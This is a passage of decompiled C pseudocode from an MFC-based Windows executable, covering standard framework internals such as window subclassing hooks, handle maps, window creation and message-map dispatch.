  struct CNoTrackObject *v14; // [esp+38h] [ebp-14h]
  int *v15; // [esp+3Ch] [ebp-10h]
  int v16; // [esp+48h] [ebp-4h]
  struct CWnd *v17; // [esp+54h] [ebp+8h]

  v15 = &v11;
  Data = CThreadLocalObject::GetData((CThreadLocalObject *)&unk_443ACC, CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
  v16 = 0;
  v14 = Data;
  qmemcpy(v12, (char *)Data + 52, sizeof(v12));
  v6 = a3;
  *((_DWORD *)Data + 13) = a2;
  *((_DWORD *)Data + 15) = a4;
  v8 = a5;
  *((_DWORD *)Data + 14) = v6;
  *((_DWORD *)Data + 16) = v8;
  if ( v6 == (CException *)2 )
  {
    v9 = *((_DWORD *)a1 + 13);
    if ( v9 )
      (*(void (__thiscall **)(int, _DWORD))(*(_DWORD *)v9 + 92))(v9, 0);
  }
  a2 = 0;
  if ( v6 == (CException *)272 )
    _AfxPreInitDialog(a1, &Rect, &a2);
  v17 = (struct CWnd *)(*(int (__thiscall **)(struct CWnd *, CException *, int, int))(*(_DWORD *)a1 + 152))(
                         a1,
                         v6,
                         a4,
                         a5);
  if ( v6 == (CException *)272 )
    _AfxPostInitDialog(a1, &Rect, a2);
  result = v17;
  qmemcpy((char *)Data + 52, v12, 0x1Cu);
  return result;
}

//----- (004186F4) --------------------------------------------------------
int __thiscall sub_4186F4(void *this)
{
  struct CNoTrackObject *Data; // eax

  Data = CThreadLocalObject::GetData((CThreadLocalObject *)&unk_443ACC, CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
  return (*(int (__thiscall **)(void *, _DWORD, _DWORD, _DWORD))(*(_DWORD *)this + 160))(
           this,
           *((_DWORD *)Data + 14),
           *((_DWORD *)Data + 15),
           *((_DWORD *)Data + 16));
}

//----- (0041878D) --------------------------------------------------------
struct CObject *__stdcall sub_41878D(void *a1)
{
  CHandleMap *v1; // esi
  struct CObject *v2; // edi

  v1 = afxMapHWND((LPVOID)1);
  v2 = CHandleMap::FromHandle(v1, a1);
  sub_41829A((int)v2, (int)v1);
  return v2;
}

//----- (004187B4) --------------------------------------------------------
void *__stdcall sub_4187B4(void *a1)
{
  struct CHandleMap *v1; // ecx
  void *result; // eax

  v1 = afxMapHWND(0);
  result = 0;
  if ( v1 )
    return CMapPtrToPtr::GetValueAt((struct CHandleMap *)((char *)v1 + 4), a1);
  return result;
}

//----- (004187D2) --------------------------------------------------------
int __thiscall sub_4187D2(_DWORD *this, int a2)
{
  struct CHandleMap *v4; // edi

  if ( !a2 )
    return 0;
  v4 = afxMapHWND((LPVOID)1);
  this[7] = a2;
  *sub_416C7F((_DWORD *)v4 + 1, a2) = (int)this;
  sub_41829A((int)this, (int)v4);
  return 1;
}

//----- (0041880B) --------------------------------------------------------
unsigned int __thiscall sub_41880B(unsigned int *this)
{
  unsigned int v2; // edi
  struct CHandleMap *v3; // eax

  v2 = this[7];
  if ( v2 )
  {
    v3 = afxMapHWND(0);
    if ( v3 )
      sub_416CCF((_DWORD *)v3 + 1, this[7]);
    this[7] = 0;
  }
  this[14] = 0;
  return v2;
}

//----- (00418839) --------------------------------------------------------
LRESULT __stdcall sub_418839(HWND hWnd, CException *Msg, WPARAM wParam, LPARAM lParam)
{
  HWND *v5; // eax

  if ( Msg == (CException *)864 )
    return 1;
  v5 = (HWND *)sub_4187B4(hWnd);
  if ( v5 && v5[7] == hWnd )
    return (LRESULT)sub_4185C2((struct CWnd *)v5, (unsigned int)hWnd, Msg, wParam, lParam);
  else
    return DefWindowProcA(hWnd, (UINT)Msg, wParam, lParam);
}

//----- (00418884) --------------------------------------------------------
LRESULT (__stdcall *sub_418884())(HWND hWnd, CException *Msg, WPARAM wParam, LPARAM lParam)
{
  return sub_418839;
}

//----- (0041888A) --------------------------------------------------------
LRESULT __stdcall sub_41888A(HWND hWnd, UINT Msg, WPARAM wParam, unsigned int lParam)
{
  LRESULT (__stdcall *PropA)(HWND, UINT, WPARAM, LPARAM); // eax
  BOOL v5; // ebx
  struct CWnd *v6; // esi
  ATOM AtomA; // ax
  struct CWnd *v9; // eax
  struct CWnd *v10; // esi
  struct CWnd *v11; // eax
  int v12; // [esp+0h] [ebp-58h] BYREF
  struct tagRECT Rect; // [esp+28h] [ebp-30h] BYREF
  __int16 v14[2]; // [esp+3Ch] [ebp-1Ch] BYREF
  WNDPROC lpPrevWndFunc; // [esp+40h] [ebp-18h]
  LRESULT v16; // [esp+44h] [ebp-14h]
  int *v17; // [esp+48h] [ebp-10h]
  int v18; // [esp+54h] [ebp-4h]

  v17 = &v12;
  PropA = (LRESULT (__stdcall *)(HWND, UINT, WPARAM, LPARAM))GetPropA(hWnd, "AfxOldWndProc423");
  v16 = 0;
  v18 = 0;
  lpPrevWndFunc = PropA;
  v5 = 1;
  switch ( Msg )
  {
    case 6u:
      v10 = sub_41878D((void *)lParam);
      v11 = sub_41878D(hWnd);
      _AfxHandleActivate(v11, wParam, v10);
LABEL_10:
      if ( !v5 )
        return v16;
      return CallWindowProcA(lpPrevWndFunc, hWnd, Msg, wParam, lParam);
    case 0x20u:
      v9 = sub_41878D(hWnd);
      v5 = _AfxHandleSetCursor(v9, (__int16)lParam, HIWORD(lParam)) == 0;
      goto LABEL_10;
    case 0x82u:
      SetWindowLongA(hWnd, -4, (LONG)lpPrevWndFunc);
      RemovePropA(hWnd, "AfxOldWndProc423");
      AtomA = GlobalFindAtomA("AfxOldWndProc423");
      GlobalDeleteAtom(AtomA);
      return CallWindowProcA(lpPrevWndFunc, hWnd, Msg, wParam, lParam);
  }
  if ( Msg != 272 )
    return CallWindowProcA(lpPrevWndFunc, hWnd, Msg, wParam, lParam);
  v6 = sub_41878D(hWnd);
  _AfxPreInitDialog(v6, &Rect, (unsigned int *)v14);
  v16 = CallWindowProcA(lpPrevWndFunc, hWnd, 0x110u, wParam, lParam);
  _AfxPostInitDialog(v6, &Rect, v14[0]);
  return v16;
}

//----- (00418A65) --------------------------------------------------------
LRESULT __stdcall sub_418A65(int code, HWND wParam, int *lParam)
{
  struct CNoTrackObject *Data; // eax
  struct CWnd *v5; // esi
  int v6; // edi
  int v7; // eax
  CHAR *v9; // eax
  int v10; // edi
  BOOL v11; // esi
  LONG v12; // eax
  LRESULT (__stdcall *v13)(HWND, CException *, WPARAM, LPARAM); // esi
  int v14; // esi
  LRESULT (__stdcall *v15)(HWND, UINT, WPARAM, unsigned int); // eax
  LRESULT v16; // edi
  CHAR Buffer[4]; // [esp+0h] [ebp-10h] BYREF
  int v18; // [esp+8h] [ebp-8h]
  struct CNoTrackObject *v19; // [esp+Ch] [ebp-4h]
  LRESULT (__stdcall *nCode)(HWND, CException *, WPARAM, LPARAM); // [esp+18h] [ebp+8h]
  HANDLE nCodea; // [esp+18h] [ebp+8h]
  LONG *wParama; // [esp+1Ch] [ebp+Ch]

  Data = CThreadLocalObject::GetData((CThreadLocalObject *)&unk_443ACC, CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
  v19 = Data;
  if ( code != 3 )
    return CallNextHookEx(*((HHOOK *)Data + 11), code, (WPARAM)wParam, (LPARAM)lParam);
  v5 = (struct CWnd *)*((_DWORD *)Data + 5);
  v6 = *lParam;
  v7 = *((unsigned __int8 *)AfxGetModuleState() + 20);
  v18 = v7;
  if ( !v5 && ((*(_BYTE *)(v6 + 35) & 0x40) != 0 || v7) )
    goto LABEL_28;
  if ( dword_445844 )
  {
    if ( (GetClassLongA(wParam, -26) & 0x10000) != 0 )
      goto LABEL_28;
    v9 = *(CHAR **)(v6 + 40);
    if ( !HIWORD(v9) )
    {
      Buffer[0] = 0;
      GlobalGetAtomNameA(*(_WORD *)(v6 + 40), Buffer, 5);
      v9 = Buffer;
    }
    if ( !lstrcmpiA(v9, "ime") )
      goto LABEL_28;
  }
  if ( !v5 )
  {
    nCodea = (HANDLE)GetWindowLongA(wParam, -4);
    if ( nCodea )
    {
      if ( !GetPropA(wParam, "AfxOldWndProc423") )
      {
        SetPropA(wParam, "AfxOldWndProc423", nCodea);
        if ( GetPropA(wParam, "AfxOldWndProc423") == nCodea )
        {
          GlobalAddAtomA("AfxOldWndProc423");
          v15 = (LRESULT (__stdcall *)(HWND, UINT, WPARAM, unsigned int))_AfxGrayBackgroundWndProc;
          if ( !*((_DWORD *)v19 + 10) )
            v15 = sub_41888A;
          SetWindowLongA(wParam, -4, (LONG)v15);
        }
      }
    }
LABEL_28:
    v14 = (int)v19;
    goto LABEL_29;
  }
  sub_4187D2(v5, (int)wParam);
  (*(void (__thiscall **)(struct CWnd *))(*(_DWORD *)v5 + 80))(v5);
  wParama = (LONG *)(*(int (__thiscall **)(struct CWnd *))(*(_DWORD *)v5 + 128))(v5);
  if ( !dword_44582C
    && !v18
    && (v10 = dword_445840) != 0
    && *(_DWORD *)(dword_445840 + 32)
    && (*(_DWORD *)Buffer = sub_4185C2(v5, (unsigned int)wParam, (CException *)0x36F, 0, 0)) != 0 )
  {
    nCode = sub_418884();
    v11 = nCode == (LRESULT (__stdcall *)(HWND, CException *, WPARAM, LPARAM))GetWindowLongA(wParam, -4);
    (*(void (__stdcall **)(HWND, _DWORD))(v10 + 32))(wParam, *(_DWORD *)Buffer);
    if ( !v11 )
    {
      v12 = SetWindowLongA(wParam, -4, (LONG)nCode);
LABEL_20:
      *wParama = v12;
    }
  }
  else
  {
    v13 = sub_418884();
    v12 = SetWindowLongA(wParam, -4, (LONG)v13);
    if ( (LRESULT (__stdcall *)(HWND, CException *, WPARAM, LPARAM))v12 != v13 )
      goto LABEL_20;
  }
  v14 = (int)v19;
  *((_DWORD *)v19 + 5) = 0;
LABEL_29:
  v16 = CallNextHookEx(*(HHOOK *)(v14 + 44), 3, (WPARAM)wParam, (LPARAM)lParam);
  if ( v18 )
  {
    UnhookWindowsHookEx(*(HHOOK *)(v14 + 44));
    *(_DWORD *)(v14 + 44) = 0;
  }
  return v16;
}
// 44582C: using guessed type int dword_44582C;
// 445844: using guessed type int dword_445844;

//----- (00418CE9) --------------------------------------------------------
BOOL __thiscall sub_418CE9(
        struct CWnd *this,
        int a2,
        const CHAR *a3,
        const CHAR *a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        HWND a10,
        HMENU a11,
        void *a12)
{
  HWND Window; // edi
  LPVOID lpParam; // [esp+4h] [ebp-30h] BYREF
  HINSTANCE hInstance; // [esp+8h] [ebp-2Ch]
  HMENU hMenu; // [esp+Ch] [ebp-28h]
  HWND hWndParent; // [esp+10h] [ebp-24h]
  int nHeight; // [esp+14h] [ebp-20h]
  int nWidth; // [esp+18h] [ebp-1Ch]
  int Y; // [esp+1Ch] [ebp-18h]
  int X; // [esp+20h] [ebp-14h]
  DWORD dwStyle; // [esp+24h] [ebp-10h]
  LPCSTR lpWindowName; // [esp+28h] [ebp-Ch]
  LPCSTR lpClassName; // [esp+2Ch] [ebp-8h]
  DWORD dwExStyle; // [esp+30h] [ebp-4h]

  dwExStyle = a2;
  lpClassName = a3;
  lpWindowName = a4;
  dwStyle = a5;
  X = a6;
  Y = a7;
  nWidth = a8;
  nHeight = a9;
  hWndParent = a10;
  hMenu = a11;
  hInstance = (HINSTANCE)*((_DWORD *)AfxGetModuleState() + 2);
  lpParam = a12;
  if ( (*(int (__thiscall **)(struct CWnd *, LPVOID *))(*(_DWORD *)this + 92))(this, &lpParam) )
  {
    AfxHookWindowCreate(this);
    Window = CreateWindowExA(
               dwExStyle,
               lpClassName,
               lpWindowName,
               dwStyle,
               X,
               Y,
               nWidth,
               nHeight,
               hWndParent,
               hMenu,
               hInstance,
               lpParam);
    if ( !AfxUnhookWindowCreate() )
      (*(void (__thiscall **)(struct CWnd *))(*(_DWORD *)this + 164))(this);
    return Window != 0;
  }
  else
  {
    (*(void (__thiscall **)(struct CWnd *))(*(_DWORD *)this + 164))(this);
    return 0;
  }
}

//----- (00418DAF) --------------------------------------------------------
int __stdcall sub_418DAF(int a1)
{
  if ( !*(_DWORD *)(a1 + 40) )
  {
    sub_41A620(1);
    *(_DWORD *)(a1 + 40) = "AfxWnd42s";
  }
  return 1;
}

//----- (00418DCF) --------------------------------------------------------
BOOL __thiscall sub_418DCF(
        struct CWnd *this,
        const CHAR *a2,
        const CHAR *a3,
        int a4,
        int *a5,
        int a6,
        HMENU a7,
        void *a8)
{
  HWND v8; // edi

  if ( a6 )
    v8 = *(HWND *)(a6 + 28);
  else
    v8 = 0;
  return sub_418CE9(this, 0, a2, a3, a4 | 0x40000000, *a5, a5[1], a5[2] - *a5, a5[3] - a5[1], v8, a7, a8);
}

//----- (00418FC8) --------------------------------------------------------
int __thiscall sub_418FC8(int *this)
{
  int v1; // eax

  v1 = *this;
  if ( this[7] )
    return (*(int (**)(void))(v1 + 88))();
  else
    return (*(int (**)(void))(v1 + 164))();
}

//----- (00418FD9) --------------------------------------------------------
int __thiscall sub_418FD9(int this)
{
  struct CHandleMap *v3; // eax
  void *ValueAt; // eax
  int v5; // ecx
  void *v6; // edi
  int v7; // eax
  int v8; // ebx

  if ( !*(_DWORD *)(this + 28) )
    return 0;
  v3 = afxMapHWND(0);
  ValueAt = CMapPtrToPtr::GetValueAt((struct CHandleMap *)((char *)v3 + 4), *(void **)(this + 28));
  v5 = *(_DWORD *)(this + 56);
  v6 = ValueAt;
  if ( v5 )
    v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 80))(v5);
  else
    v7 = DestroyWindow(*(HWND *)(this + 28));
  v8 = v7;
  if ( !v6 )
    sub_41880B((unsigned int *)this);
  return v8;
}

//----- (00419026) --------------------------------------------------------
LRESULT __thiscall sub_419026(void *this, UINT Msg, WPARAM wParam, LPARAM lParam)
{
  LRESULT (__stdcall *v5)(HWND, UINT, WPARAM, LPARAM); // eax

  v5 = (LRESULT (__stdcall *)(HWND, UINT, WPARAM, LPARAM))*((_DWORD *)this + 10);
  if ( v5 )
    return CallWindowProcA(v5, *((HWND *)this + 7), Msg, wParam, lParam);
  v5 = *(LRESULT (__stdcall **)(HWND, UINT, WPARAM, LPARAM))(*(int (__thiscall **)(void *))(*(_DWORD *)this + 128))(this);
  if ( v5 )
    return CallWindowProcA(v5, *((HWND *)this + 7), Msg, wParam, lParam);
  else
    return DefWindowProcA(*((HWND *)this + 7), Msg, wParam, lParam);
}

//----- (0041906D) --------------------------------------------------------
char *__thiscall sub_41906D(char *this)
{
  return this + 40;
}

//----- (00419090) --------------------------------------------------------
__int16 __stdcall sub_419090(int a1)
{
  struct _AFX_THREAD_STATE *ThreadState; // esi
  HWND v2; // eax
  int v3; // esi

  ThreadState = AfxGetThreadState();
  v2 = (HWND)*((_DWORD *)ThreadState + 51);
  if ( v2 )
  {
    v2 = (HWND)*((_DWORD *)v2 + 7);
    if ( v2 )
      LOWORD(v2) = SendMessageA(v2, 0x401u, 0, 0);
  }
  v3 = *((_DWORD *)ThreadState + 66);
  if ( a1 )
  {
    if ( v3 )
    {
      LOWORD(v2) = GetKeyState(1);
      if ( (__int16)v2 >= 0 )
        LOWORD(v2) = (*(int (__thiscall **)(int, int))(*(_DWORD *)v3 + 220))(v3, -1);
    }
  }
  return (__int16)v2;
}

//----- (00419158) --------------------------------------------------------
int __thiscall sub_419158(void *this, int a2, int a3)
{
  void *v4; // eax
  int result; // eax

  if ( *(_DWORD *)a3 == 1 )
  {
    v4 = sub_41AD62(*(void **)(a3 + 20));
    if ( v4 )
      return (*(int (__thiscall **)(void *, int))(*(_DWORD *)v4 + 12))(v4, a3);
  }
  else
  {
    result = sub_419E59(*(HWND *)(a3 + 20), 0);
    if ( result )
      return result;
  }
  return sub_4186F4(this);
}

//----- (0041920A) --------------------------------------------------------
void *__stdcall sub_41920A(int a1, int a2)
{
  int MenuItemCount; // ebx
  int i; // edi
  HMENU SubMenu; // eax
  struct CObject *v5; // eax
  void *result; // eax

  MenuItemCount = GetMenuItemCount(*(HMENU *)(a1 + 4));
  for ( i = 0; i < MenuItemCount; ++i )
  {
    SubMenu = GetSubMenu(*(HMENU *)(a1 + 4), i);
    v5 = sub_41AD4D(SubMenu);
    if ( v5 )
    {
      result = (void *)sub_41920A(v5, a2);
      if ( result )
        return result;
    }
    else if ( GetMenuItemID(*(HMENU *)(a1 + 4), i) == a2 )
    {
      return sub_41AD62(*(void **)(a1 + 4));
    }
  }
  return 0;
}

//----- (0041926D) --------------------------------------------------------
int __thiscall sub_41926D(HWND *this, int a2, _DWORD *a3)
{
  struct CNoTrackObject *Data; // eax
  struct CObject *v5; // eax
  void *v6; // eax
  struct CWnd *DescendantWindow; // eax
  int result; // eax
  HMENU Menu; // [esp-4h] [ebp-Ch]

  if ( *a3 == 1 )
  {
    Data = CThreadLocalObject::GetData((CThreadLocalObject *)&unk_443ACC, CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
    if ( *((HWND *)Data + 20) == this[7] )
    {
      v5 = sub_41AD4D(*((void **)Data + 21));
    }
    else
    {
      Menu = GetMenu(this[7]);
      v5 = sub_41AD4D(Menu);
    }
    v6 = sub_41920A((int)v5, a3[2]);
    if ( v6 )
      (*(void (__thiscall **)(void *, _DWORD *))(*(_DWORD *)v6 + 16))(v6, a3);
    return sub_4186F4(this);
  }
  DescendantWindow = CWnd::GetDescendantWindow(this[7], a3[1], 1);
  if ( !DescendantWindow )
    return sub_4186F4(this);
  result = sub_419E2C(DescendantWindow, 0);
  if ( !result )
    return sub_4186F4(this);
  return result;
}

//----- (004192E5) --------------------------------------------------------
int __stdcall sub_4192E5(WNDCLASSA *lpWndClass)
{
  WNDCLASSA *v1; // esi
  CHAR *v3; // edi
  int v4; // [esp+0h] [ebp-48h] BYREF
  struct tagWNDCLASSA WndClass; // [esp+10h] [ebp-38h] BYREF
  int *v6; // [esp+38h] [ebp-10h]
  int v7; // [esp+44h] [ebp-4h]

  v1 = lpWndClass;
  v6 = &v4;
  if ( !GetClassInfoA(lpWndClass->hInstance, lpWndClass->lpszClassName, &WndClass) )
  {
    if ( !RegisterClassA(v1) )
      return 0;
    if ( *((_BYTE *)AfxGetModuleState() + 20) )
    {
      sub_41D756(1);
      v7 = 0;
      v3 = (char *)AfxGetModuleState() + 52;
      lstrcatA(v3, v1->lpszClassName);
      HIWORD(lpWndClass) = 10;
      lstrcatA(v3, (LPCSTR)&lpWndClass + 2);
      v7 = -1;
      AfxUnlockGlobals(1);
    }
  }
  return 1;
}

//----- (004193CC) --------------------------------------------------------
int __thiscall sub_4193CC(HWND *this, ULONG_PTR dwData, UINT uCommand)
{
  struct CObject *v4; // esi
  HWND Capture; // eax
  int v7; // [esp+8h] [ebp-10h]

  v7 = *((_DWORD *)AfxGetModuleState() + 1);
  AfxGetModuleState();
  sub_41778B();
  if ( (*((int (__thiscall **)(HWND *))*this + 44))(this) )
    (*((void (__thiscall **)(HWND *))*this + 60))(this);
  SendMessageA(this[7], 0x1Fu, 0, 0);
  CWnd::SendMessageToDescendants(this[7], 0x1Fu, 0, 0, 1, 1);
  v4 = sub_419C60(this);
  SendMessageA(*((HWND *)v4 + 7), 0x1Fu, 0, 0);
  CWnd::SendMessageToDescendants(*((HWND *)v4 + 7), 0x1Fu, 0, 0, 1, 1);
  Capture = GetCapture();
  if ( Capture )
    SendMessageA(Capture, 0x1Fu, 0, 0);
  if ( !WinHelpA(*((HWND *)v4 + 7), *(LPCSTR *)(v7 + 140), uCommand, dwData) )
    sub_41BD6F(0xF107u, 0, -1);
  AfxGetModuleState();
  return sub_4177A0();
}

//----- (004194AE) --------------------------------------------------------
void **sub_4194AE()
{
  return &off_4209C0;
}
// 4209C0: using guessed type void *off_4209C0;

//----- (004194F4) --------------------------------------------------------
int __thiscall sub_4194F4(void *this, int a2, int a3, int a4)
{
  int v6; // [esp+4h] [ebp-4h] BYREF

  v6 = 0;
  if ( !(*(int (__thiscall **)(void *, int, int, int, int *))(*(_DWORD *)this + 156))(this, a2, a3, a4, &v6) )
    return (*(int (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 160))(this, a2, a3, a4);
  return v6;
}

//----- (00419538) --------------------------------------------------------
int __thiscall sub_419538(struct CWnd *this, unsigned int a2, WPARAM wParam, unsigned int a4, _DWORD *a5)
{
  int v6; // eax
  struct CWnd *v8; // eax
  int v9; // ebx
  unsigned int v10; // ecx
  bool v11; // zf
  unsigned int *v12; // ebx
  int *v13; // eax
  _DWORD *v14; // ebx
  _DWORD *v15; // eax
  _DWORD **v16; // eax
  _DWORD *v18; // ecx
  int (__thiscall *v19)(struct CWnd *, struct CObject *); // ebx
  int v20; // eax
  unsigned __int8 Version; // al
  int v22; // eax
  int v23; // eax
  struct CObject *v24; // eax
  struct CObject *v25; // eax
  int v26; // eax
  void *v27; // eax
  int v28; // esi
  _DWORD *v29; // eax
  int v30; // eax
  void *ValueAt; // eax
  int v32; // eax
  int v33; // eax
  struct CObject *v34; // eax
  struct CObject *v35; // eax
  int v36; // eax
  struct CObject *v37; // eax
  struct CObject *v38; // eax
  struct CObject *v39; // eax
  struct CObject *v40; // eax
  int v41; // edx
  int v42; // eax
  struct CObject *v43; // [esp-8h] [ebp-74h]
  struct CObject *v44; // [esp-8h] [ebp-74h]
  struct CObject *v45; // [esp-4h] [ebp-70h]
  unsigned int v46; // [esp-4h] [ebp-70h]
  WPARAM v47; // [esp-4h] [ebp-70h]
  int v48; // [esp-4h] [ebp-70h]
  unsigned int v49; // [esp-4h] [ebp-70h]
  unsigned int v50; // [esp-4h] [ebp-70h]
  struct CObject *v51; // [esp-4h] [ebp-70h]
  struct CObject *v52; // [esp-4h] [ebp-70h]
  struct CObject *v53; // [esp-4h] [ebp-70h]
  _DWORD v54[7]; // [esp+Ch] [ebp-60h] BYREF
  void *v55; // [esp+28h] [ebp-44h]
  void *v56; // [esp+44h] [ebp-28h]
  unsigned int v57; // [esp+48h] [ebp-24h] BYREF
  int v58; // [esp+4Ch] [ebp-20h]
  int *v59; // [esp+58h] [ebp-14h]
  int v60; // [esp+5Ch] [ebp-10h] BYREF
  int v61; // [esp+68h] [ebp-4h]
  int v62; // [esp+74h] [ebp+8h]
  WPARAM wParama; // [esp+78h] [ebp+Ch]
  _DWORD *v64; // [esp+7Ch] [ebp+10h]
  _DWORD **v65; // [esp+7Ch] [ebp+10h]

  v60 = 0;
  switch ( a2 )
  {
    case 0x111u:
      if ( (*(int (__thiscall **)(struct CWnd *, WPARAM, unsigned int))(*(_DWORD *)this + 120))(this, wParam, a4) )
      {
LABEL_90:
        v60 = 1;
        goto LABEL_96;
      }
      return 0;
    case 0x4Eu:
      if ( *(_DWORD *)a4 )
      {
        v6 = (*(int (__thiscall **)(struct CWnd *, WPARAM, unsigned int, int *))(*(_DWORD *)this + 124))(
               this,
               wParam,
               a4,
               &v60);
LABEL_7:
        if ( v6 )
          goto LABEL_96;
      }
      return 0;
    case 6u:
      v8 = sub_41878D((void *)a4);
      _AfxHandleActivate(this, wParam, v8);
      break;
  }
  if ( a2 == 32 && _AfxHandleSetCursor(this, (__int16)a4, HIWORD(a4)) )
    goto LABEL_90;
  v59 = (int *)(*(int (__thiscall **)(struct CWnd *))(*(_DWORD *)this + 40))(this);
  v9 = a2 & 0x1FF ^ (unsigned __int16)v59 & 0x1FF;
  sub_41D756(7);
  v10 = a2;
  v11 = a2 == dword_443C90[3 * v9];
  v12 = (unsigned int *)(12 * v9 + 4471952);
  v13 = v59;
  if ( v11 && v59 == (int *)v12[2] )
  {
    v14 = (_DWORD *)v12[1];
    v64 = v14;
    AfxUnlockGlobals(7);
    if ( !v14 )
      return 0;
    if ( a2 >= 0xC000 )
      goto LABEL_93;
LABEL_33:
    v18 = v64;
    v19 = (int (__thiscall *)(struct CWnd *, struct CObject *))v14[5];
    v20 = v64[4];
    if ( v64[2] == 26 )
    {
      Version = GetVersion();
      v18 = v64;
      v22 = -(Version < 4u);
      LOBYTE(v22) = v22 & 0xF0;
      v20 = v22 + 47;
    }
    switch ( v20 )
    {
      case 1:
        v45 = sub_41AEEB((void *)wParam);
        v23 = v19(this, v45);
        goto LABEL_95;
      case 2:
        v23 = v19(this, (struct CObject *)wParam);
        goto LABEL_95;
      case 3:
      case 8:
        v46 = HIWORD(a4);
        v43 = (struct CObject *)(__int16)a4;
        v24 = sub_41878D((void *)wParam);
        goto LABEL_54;
      case 4:
        CDC::CDC((CDC *)&v57);
        v26 = *(_DWORD *)(a4 + 4);
        v61 = 0;
        v58 = v26;
        sub_4183E5(v54);
        v27 = *(void **)a4;
        v28 = *(_DWORD *)(a4 + 8);
        LOBYTE(v61) = 1;
        v55 = v27;
        v29 = sub_4187B4(v27);
        if ( !v29 )
        {
          v30 = *((_DWORD *)this + 13);
          if ( v30 )
          {
            ValueAt = CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(v30 + 32), v55);
            if ( ValueAt )
              v56 = ValueAt;
          }
          v29 = v54;
        }
        v32 = ((int (__thiscall *)(struct CWnd *, unsigned int *, _DWORD *, int))v19)(this, &v57, v29, v28);
        v58 = 0;
        v55 = 0;
        LOBYTE(v61) = 0;
        v60 = v32;
        CWnd::~CWnd((CWnd *)v54);
        v61 = -1;
        goto LABEL_47;
      case 5:
        CDC::CDC((CDC *)&v57);
        v48 = *(_DWORD *)(a4 + 8);
        v58 = *(_DWORD *)(a4 + 4);
        v61 = 2;
        v33 = ((int (__thiscall *)(struct CWnd *, unsigned int *, int))v19)(this, &v57, v48);
        v58 = 0;
        v61 = -1;
        v60 = v33;
LABEL_47:
        sub_41AF31(&v57);
        goto LABEL_96;
      case 6:
        v46 = HIWORD(wParam);
        v34 = sub_41878D((void *)a4);
        goto LABEL_53;
      case 7:
        v47 = HIWORD(wParam);
        v25 = (struct CObject *)(unsigned __int16)wParam;
        goto LABEL_81;
      case 9:
      case 42:
        v23 = v19(this, (struct CObject *)a4);
        goto LABEL_95;
      case 10:
      case 33:
        goto LABEL_94;
      case 11:
        v46 = (unsigned int)sub_41AD4D((void *)a4);
        v34 = (struct CObject *)HIWORD(wParam);
LABEL_53:
        v43 = v34;
        v24 = (struct CObject *)(unsigned __int16)wParam;
LABEL_54:
        v23 = ((int (__thiscall *)(struct CWnd *, struct CObject *, struct CObject *, unsigned int))v19)(
                this,
                v24,
                v43,
                v46);
        goto LABEL_95;
      case 12:
        ((void (__thiscall *)(struct CWnd *))v19)(this);
        goto LABEL_96;
      case 13:
        v19(this, (struct CObject *)wParam);
        goto LABEL_96;
      case 14:
      case 18:
      case 37:
      case 47:
        v52 = (struct CObject *)a4;
        goto LABEL_79;
      case 15:
        v49 = SHIWORD(a4);
        v35 = (struct CObject *)(__int16)a4;
        goto LABEL_58;
      case 16:
      case 17:
        v50 = HIWORD(a4);
        v36 = (unsigned __int16)a4;
        goto LABEL_88;
      case 19:
        v51 = sub_41878D((void *)wParam);
        v44 = sub_41878D((void *)a4);
        v37 = (struct CObject *)(*((_DWORD *)this + 7) == a4);
        goto LABEL_61;
      case 20:
        v38 = sub_41AEEB((void *)wParam);
        goto LABEL_63;
      case 21:
        v38 = sub_41AD4D((void *)wParam);
        goto LABEL_63;
      case 22:
        v51 = (struct CObject *)HIWORD(a4);
        v44 = (struct CObject *)(unsigned __int16)a4;
        v37 = sub_41AD4D((void *)wParam);
        goto LABEL_61;
      case 23:
        v38 = sub_41878D((void *)wParam);
        goto LABEL_63;
      case 24:
        v51 = (struct CObject *)HIWORD(a4);
        v39 = (struct CObject *)(unsigned __int16)a4;
        goto LABEL_71;
      case 25:
        v39 = (struct CObject *)(__int16)a4;
        v51 = (struct CObject *)SHIWORD(a4);
LABEL_71:
        v44 = v39;
        v37 = sub_41878D((void *)wParam);
        goto LABEL_61;
      case 26:
        v49 = a4;
        v35 = sub_41878D((void *)wParam);
LABEL_58:
        ((void (__thiscall *)(struct CWnd *, struct CObject *, unsigned int))v19)(this, v35, v49);
        goto LABEL_96;
      case 27:
        v52 = sub_41878D((void *)a4);
LABEL_79:
        ((void (__thiscall *)(struct CWnd *, WPARAM, struct CObject *))v19)(this, wParam, v52);
        goto LABEL_96;
      case 28:
        v51 = (struct CObject *)HIWORD(wParam);
        v40 = sub_41878D((void *)a4);
        goto LABEL_86;
      case 29:
      case 30:
        v41 = (__int16)wParam;
        v62 = (__int16)wParam;
        v42 = SHIWORD(wParam);
        wParama = SHIWORD(wParam);
        if ( v18[4] == 29 )
        {
          v53 = sub_41878D((void *)a4);
          ((void (__thiscall *)(struct CWnd *, int, WPARAM, struct CObject *))v19)(this, v62, wParama, v53);
        }
        else
        {
          ((void (__thiscall *)(struct CWnd *, int, int))v19)(this, v41, v42);
        }
        goto LABEL_96;
      case 31:
      case 36:
        v19(this, (struct CObject *)a4);
        goto LABEL_96;
      case 32:
      case 43:
        ((void (__thiscall *)(struct CWnd *, WPARAM, unsigned int))v19)(this, wParam, a4);
        goto LABEL_90;
      case 34:
        v25 = (struct CObject *)(__int16)a4;
        v47 = SHIWORD(a4);
        goto LABEL_81;
      case 35:
        v23 = ((int (__thiscall *)(struct CWnd *))v19)(this);
        goto LABEL_95;
      case 44:
        v38 = sub_41878D((void *)a4);
LABEL_63:
        v19(this, v38);
        goto LABEL_96;
      case 45:
        v47 = a4;
        v25 = sub_41878D((void *)wParam);
LABEL_81:
        v23 = ((int (__thiscall *)(struct CWnd *, struct CObject *, WPARAM))v19)(this, v25, v47);
        goto LABEL_95;
      case 46:
        v6 = ((int (__thiscall *)(struct CWnd *, _DWORD, WPARAM, _DWORD, unsigned int))v19)(
               this,
               (unsigned __int16)wParam,
               HIWORD(wParam),
               (unsigned __int16)a4,
               HIWORD(a4));
        v60 = v6;
        goto LABEL_7;
      case 48:
        v51 = (struct CObject *)a4;
        v40 = (struct CObject *)HIWORD(wParam);
LABEL_86:
        v44 = v40;
        v37 = (struct CObject *)(unsigned __int16)wParam;
LABEL_61:
